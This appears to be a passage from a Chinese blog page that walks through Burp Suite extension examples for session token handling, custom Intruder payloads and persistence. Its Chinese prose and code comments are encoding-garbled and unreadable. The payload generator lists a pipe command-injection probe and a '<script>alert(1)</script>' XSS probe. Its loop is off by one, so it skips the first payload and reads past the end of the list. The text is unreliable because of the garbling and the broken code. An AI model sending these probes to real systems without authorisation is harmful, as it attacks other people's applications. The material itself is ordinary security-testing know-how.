&#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Session token example&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.http().registerSessionHandlingAction(<span class="keyword">new</span> <span class="title class_">MySessionHandlingAction</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ’ä»¶ä¸»è¦ç”¨äºä»¥ä¸‹å‡ ç§åœºæ™¯ä¸­ï¼š</p><ol><li><strong>è‡ªåŠ¨åŒ–ä¼šè¯ç®¡ç†</strong>ï¼š<ul><li>åœ¨è¿›è¡Œè‡ªåŠ¨åŒ–æ¸—é€æµ‹è¯•æˆ–åŠŸèƒ½æµ‹è¯•æ—¶ï¼Œç‰¹åˆ«æ˜¯å½“ä¼šè¯ä»¤ç‰Œéœ€è¦é¢‘ç¹æ›´æ–°ä»¥ä¿æŒä¼šè¯æ´»è·ƒçš„åœºåˆï¼Œæ­¤æ’ä»¶å¯ä»¥è‡ªåŠ¨åœ°ä»å…ˆå‰çš„äº¤äº’ï¼ˆå¦‚ç™»å½•åçš„å“åº”ï¼‰ä¸­æå–æ–°çš„ä¼šè¯ä»¤ç‰Œï¼Œå¹¶ç”¨å…¶æ›´æ–°éšåçš„è¯·æ±‚ã€‚è¿™ç¡®ä¿äº†æµ‹è¯•è¿‡ç¨‹ä¸­çš„ä¼šè¯æœ‰æ•ˆæ€§å’Œè¿ç»­æ€§ã€‚</li></ul></li><li><strong>å¤šæ­¥éª¤è¿‡ç¨‹ä¸­çš„ä»¤ç‰Œç®¡ç†</strong>ï¼š<ul><li>åœ¨éœ€è¦æ‰§è¡Œå¤šä¸ªä¾èµ–äºç‰¹å®šä¼šè¯çŠ¶æ€çš„æ­¥éª¤çš„æµ‹è¯•ä¸­ï¼Œå¦‚è´­ç‰©è½¦æ·»åŠ å•†å“ã€ç»“è´¦ç­‰æ­¥éª¤ï¼Œæ­¤æ’ä»¶èƒ½å¤Ÿç¡®ä¿æ¯ä¸€æ­¥ä½¿ç”¨æ­£ç¡®çš„ä¼šè¯ä»¤ç‰Œï¼Œä»è€Œé¿å…æµ‹è¯•å› ä¼šè¯è¿‡æœŸæˆ–ä»¤ç‰Œå¤±æ•ˆè€Œå¤±è´¥ã€‚</li></ul></li><li><strong>åº”å¯¹é˜²å¾¡æœºåˆ¶</strong>ï¼š<ul><li>åœ¨ç›®æ ‡åº”ç”¨å®æ–½äº†ä¸¥æ ¼çš„ä¼šè¯ç®¡ç†ç­–ç•¥ï¼ˆä¾‹å¦‚ä¼šè¯å›ºå®šã€ä¼šè¯è¶…æ—¶ã€æ¯æ¬¡è¯·æ±‚åæ›´æ–°ä»¤ç‰Œç­‰ï¼‰çš„æƒ…å†µä¸‹ï¼Œæ­¤æ’ä»¶é€šè¿‡åŠ¨æ€æ›´æ–°ä¼šè¯ä»¤ç‰Œæ¥å¸®åŠ©ç»•è¿‡è¿™äº›æœºåˆ¶ï¼Œå…è®¸æµ‹è¯•è€…æ¨¡æ‹Ÿæˆ–ç»´æŒä¸€ä¸ªæŒä¹…çš„ä¼šè¯çŠ¶æ€ã€‚</li></ul></li><li><strong>å®å’Œè‡ªå®šä¹‰è„šæœ¬ä¸­ä½¿ç”¨</strong>ï¼š<ul><li>å½“ä½¿ç”¨ Burp Suite çš„å®åŠŸèƒ½è¿›è¡Œå¤æ‚çš„é¢„é…ç½®ä»»åŠ¡æ—¶ï¼Œå¦‚è‡ªåŠ¨ç™»å½•å¹¶æ‰§è¡Œä¸€ç³»åˆ—æ“ä½œï¼Œæ­¤æ’ä»¶å¯ä»¥è¢«é…ç½®ä¸ºå®çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºåœ¨æ‰§è¡Œå®æ—¶è‡ªåŠ¨å¤„ç†ä¼šè¯ä»¤ç‰Œçš„æ›´æ–°ã€‚</li></ul></li><li><strong>ç»´æŒæ´»è·ƒä¼šè¯</strong>ï¼š<ul><li>åœ¨æµ‹è¯•éœ€è¦é•¿æ—¶é—´è¿è¡Œçš„è„šæœ¬æˆ–è¿‡ç¨‹æ—¶ï¼Œä¾‹å¦‚é•¿æ—¶é—´çš„æ¼æ´æ‰«ææˆ–å¤§é‡æ•°æ®çš„ä¼ è¾“æµ‹è¯•ï¼Œæ­¤æ’ä»¶èƒ½å¤Ÿå¸®åŠ©ç»´æŠ¤ä¼šè¯çš„æ´»è·ƒçŠ¶æ€ï¼Œé¿å…å› ä¼šè¯è¶…æ—¶è€Œå¯¼è‡´çš„ä¸­æ–­ã€‚</li></ul></li></ol><h2 id="Custom-Intruder-Payloads-Example-Extension"><a href="#Custom-Intruder-Payloads-Example-Extension" class="headerlink" title="Custom Intruder Payloads Example Extension"></a>Custom Intruder Payloads Example Extension</h2><p>This example shows how you can use an extension to:</p><ul><li>Generate custom Intruder payloads</li><li>Apply custom processing to Intruder payloads (including built-in ones)</li></ul><p>When an extension registers itself as an Intruder payload provider, this will be available within the Intruder UI for the user to select as the payload source for an attack. When an extension registers itself as a payload processor, the user can create a payload processing rule and select the extensionâ€™s processor as the ruleâ€™s action.</p><p>The extension uses the following techniques:</p><ul><li>Registers a new <code>PayloadGeneratorProvider</code>, which returns a new <code>PayloadGenerator</code></li><li>Registers a new <code>PayloadProcessor</code></li><li>The <code>PayloadGenerator</code> does the following:<ul><li>Contains a list of payloads to be used</li><li>Iterates through the payload list, until there are no longer any payloads available</li></ul></li><li>The <code>PayloadProcessor</code> does the following:<ul><li>Decodes the base value of the payload</li><li>Parses the location of the <code>input</code> string in the decoded data</li><li>Rebuilds the serialized data with the new payload</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> aiassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.ByteArray;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadData;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadProcessingResult;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadProcessor;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.Base64Utils;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.URLUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.intruder.PayloadProcessingResult.usePayload;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° PayloadProcessor æ¥å£çš„ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyPayloadProcessor</span> <span class="keyword">implements</span> <span class="title class_">PayloadProcessor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INPUT_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;input=&quot;</span>; <span class="comment">// å®šä¹‰è¾“å…¥å‰ç¼€ï¼Œç”¨äºè§£æå’Œé‡å»ºæ•°æ®</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyPayloadProcessor</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api; <span class="comment">// è·å– Montoya API å®ä¾‹</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">displayName</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Serialized input wrapper&quot;</span>; <span class="comment">// æ˜¾ç¤ºåï¼Œç”¨äºè¯†åˆ«å¤„ç†å™¨</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PayloadProcessingResult <span class="title function_">processPayload</span><span class="params">(PayloadData payloadData)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Base64Utils</span> <span class="variable">base64Utils</span> <span class="operator">=</span> api.utilities().base64Utils();</span><br><span class="line">        <span class="type">URLUtils</span> <span class="variable">urlUtils</span> <span class="operator">=</span> api.utilities().urlUtils();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¯¹åŸºç¡€å€¼è¿›è¡Œè§£ç </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">dataParameter</span> <span class="operator">=</span> base64Utils.decode(urlUtils.decode(payloadData.insertionPoint().baseValue())).toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§£æè¾“å…¥å­—ç¬¦ä¸²åœ¨è§£ç æ•°æ®ä¸­çš„ä½ç½®</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> findPrefix(dataParameter);</span><br><span class="line">        <span class="keyword">if</span> (prefix == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> usePayload(payloadData.currentPayload()); <span class="comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°å‰ç¼€ï¼Œä½¿ç”¨å½“å‰è´Ÿè½½</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> findSuffix(dataParameter);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨æ–°è´Ÿè½½é‡å»ºåºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">rebuiltDataParameter</span> <span class="operator">=</span> prefix + payloadData.currentPayload() + suffix;</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">reserializedDataParameter</span> <span class="operator">=</span> urlUtils.encode(base64Utils.encode(rebuiltDataParameter));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> usePayload(reserializedDataParameter); <span class="comment">// è¿”å›å¤„ç†åçš„è´Ÿè½½</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">findPrefix</span><span class="params">(String dataParameter)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> dataParameter.indexOf(INPUT_PREFIX);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// å¦‚æœæ²¡æœ‰æ‰¾åˆ°å‰ç¼€ï¼Œè¿”å› null</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start += INPUT_PREFIX.length();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dataParameter.substring(<span class="number">0</span>, start);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">findSuffix</span><span class="params">(String dataParameter)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> dataParameter.indexOf(INPUT_PREFIX);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> dataParameter.indexOf(<span class="string">&quot;&amp;&quot;</span>, start);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            end = dataParameter.length();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dataParameter.substring(end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.AttackConfiguration;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadGenerator;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadGeneratorProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyPayloadGeneratorProvider</span> <span class="keyword">implements</span> <span class="title class_">PayloadGeneratorProvider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">displayName</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;My custom payloads&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PayloadGenerator <span class="title function_">providePayloadGenerator</span><span class="params">(AttackConfiguration attackConfiguration)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyPayloadGenerator</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.GeneratedPayload;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.IntruderInsertionPoint;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.intruder.PayloadGenerator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyPayloadGenerator</span> <span class="keyword">implements</span> <span class="title class_">PayloadGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; PAYLOADS = List.of(<span class="string">&quot;|&quot;</span>, <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> payloadIndex;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> GeneratedPayload <span class="title function_">generatePayloadFor</span><span class="params">(IntruderInsertionPoint insertionPoint)</span></span><br><span class="line">    &#123;</span><br><span class="line">        payloadIndex++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (payloadIndex &gt; PAYLOADS.size())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> GeneratedPayload.end();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> PAYLOADS.get(payloadIndex);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> GeneratedPayload.payload(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntruderPayloads</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Intruder payloads&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.intruder().registerPayloadGeneratorProvider(<span class="keyword">new</span> <span class="title class_">MyPayloadGeneratorProvider</span>());</span><br><span class="line">        api.intruder().registerPayloadProcessor(<span class="keyword">new</span> <span class="title class_">MyPayloadProcessor</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/24/tools/burpsuite-plugins2/image.png" alt="åœ¨è¿™é‡Œå¯ä»¥é€‰æ‹©ç”Ÿæˆpayloadçš„æ–¹å¼"></p><h2 id="Persistence-Example-Extension"><a href="#Persistence-Example-Extension" class="headerlink" title="Persistence Example Extension"></a>Persistence Example Extension</h2><p>The extension works as follows:</p><ul><li>It saves and loads a simple incrementing integer value with the project file.<ul><li>Sends to the event log how many times Burp or the extension were restarted.</li></ul></li><li>It saves and loads extension built http requests<ul><li>Sends the  requests to repeater with an incrementing tab counter when Burp is restarted or the extension is reloaded.</li></ul></li><li>It saves the last 5 requests&#x2F;responses issued by Burp<ul><li>Prints the last 5 request&#x2F;responses to the output log when burp is restarted or the extension is reloaded. </li><li>Uses Persisted Lists to automatically save&#x2F;load data stored in the list.</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.persistence.PersistedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.requests.HttpRequest.httpRequest;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.requests.HttpRequest.httpRequestFromUrl;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> example.persistence.PersistenceExample.STARTUP_COUNT_KEY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SavingLoadingRequests</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SIMPLE_REQUEST_KEY</span> <span class="operator">=</span> <span class="string">&quot;simpleRequest&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REQUEST_WITH_HEADERS_KEY</span> <span class="operator">=</span> <span class="string">&quot;requestWithHeaders&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">REQUEST_FROM_URL_KEY</span> <span class="operator">=</span> <span class="string">&quot;requestFromUrl&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PersistedObject myExtensionData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SavingLoadingRequests</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">        <span class="built_in">this</span>.myExtensionData = api.persistence().extensionData();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿è¡Œç¤ºä¾‹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runExample</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// æ£€æŸ¥æ˜¯å¦å·²ç»ä¿å­˜äº†ç¤ºä¾‹è¯·æ±‚</span></span><br><span class="line">        <span class="keyword">if</span> (!checkForRequests()) &#123;</span><br><span class="line">            api.logging().raiseInfoEvent(<span class="string">&quot;No Requests saved, creating requests&quot;</span>);</span><br><span class="line">            createAndSaveExampleRequests();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sendExampleRequestsToRepeaterWithStartupCount();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¿å­˜çš„è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">checkForRequests</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–ä¿å­˜çš„ HTTP è¯·æ±‚çš„é”®é›†åˆï¼Œå¹¶æ£€æŸ¥æ‰€éœ€çš„é”®æ˜¯å¦éƒ½å­˜åœ¨</span></span><br><span class="line">        <span class="keyword">return</span> myExtensionData.httpRequestKeys().contains(SIMPLE_REQUEST_KEY) &amp;&amp;</span><br><span class="line">                myExtensionData.httpRequestKeys().contains(REQUEST_WITH_HEADERS_KEY) &amp;&amp;</span><br><span class="line">                myExtensionData.httpRequestKeys().contains(REQUEST_FROM_URL_KEY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºå¹¶ä¿å­˜ç¤ºä¾‹è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">createAndSaveExampleRequests</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">simpleRequest</span> <span class="operator">=</span> httpRequest(<span class="string">&quot;GET / HTTP1.0\r\n\r\n&quot;</span>);</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">requestWithHeaders</span> <span class="operator">=</span> httpRequest(<span class="string">&quot;GET / HTTP1.1\r\nHost: localhost\r\nMyHeader: Example\r\n\r\n&quot;</span>);</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">requestFromUrl</span> <span class="operator">=</span> httpRequestFromUrl(<span class="string">&quot;http://localhost&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å°†æ¯ä¸ªè¯·æ±‚ä¿å­˜åˆ°å…¶å¯¹åº”çš„é”®ä¸‹</span></span><br><span class="line">        myExtensionData.setHttpRequest(SIMPLE_REQUEST_KEY, simpleRequest);</span><br><span class="line">        myExtensionData.setHttpRequest(REQUEST_WITH_HEADERS_KEY, requestWithHeaders);</span><br><span class="line">        myExtensionData.setHttpRequest(REQUEST_FROM_URL_KEY, requestFromUrl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†è¯·æ±‚å‘é€åˆ° Repeaterï¼Œå¹¶åœ¨æ ‡ç­¾åç§°ä¸­åŠ å…¥å¯åŠ¨è®¡æ•°</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendExampleRequestsToRepeaterWithStartupCount</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">simpleRequest</span> <span class="operator">=</span> myExtensionData.getHttpRequest(SIMPLE_REQUEST_KEY);</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">requestWithHeaders</span> <span class="operator">=</span> myExtensionData.getHttpRequest(REQUEST_WITH_HEADERS_KEY);</span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">requestFromUrl</span> <span class="operator">=</span> 